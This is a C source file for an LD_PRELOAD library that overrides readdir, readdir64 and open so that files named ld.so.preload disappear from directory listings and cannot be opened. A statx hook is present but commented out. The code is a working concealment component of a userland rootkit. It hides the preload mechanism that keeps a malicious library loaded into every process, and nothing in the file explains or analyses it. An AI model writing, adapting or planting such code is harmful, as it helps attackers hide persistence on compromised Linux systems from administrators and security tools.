#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/stat.h>
#include <linux/stat.h>
#include "preload.h"



// int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *buf) {
//     int (*r_statx)(int, const char *, int, unsigned int, struct statx *) = dlsym(RTLD_NEXT, "statx");

//     if (strstr(pathname, "ld.so.preload")) {
//         errno = 2;
//         return -1;
//     }
//     return r_statx(dirfd, pathname, flags, mask, buf);
// }

struct dirent64 *readdir64(DIR *dirp){
    struct dirent64 *(*r_readdir64)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;
    while ((entry = r_readdir64(dirp)) != NULL) {
      if (strstr(entry->d_name, "ld.so.preload")) {
        continue;
      }
      return entry;
    }
    return NULL;
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*r_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = r_readdir(dirp)) != NULL) {
      if (strstr(entry->d_name, "ld.so.preload")) {
        continue;
      }
      return entry;
    }
    return NULL;
}


int open(const char *pathname, int flags, ...) {
  int (*r_open)(const char *pathname, int flags, ...) = dlsym(RTLD_NEXT, "open");
  va_list args;
  va_start(args, flags);
  int output = r_open(pathname, flags, va_arg(args, int));
  if (strstr(pathname, "ld.so.preload")) {
    close(output);
    errno = 2;
    return -1;
  }
  va_end(args);
  return output;
}


 

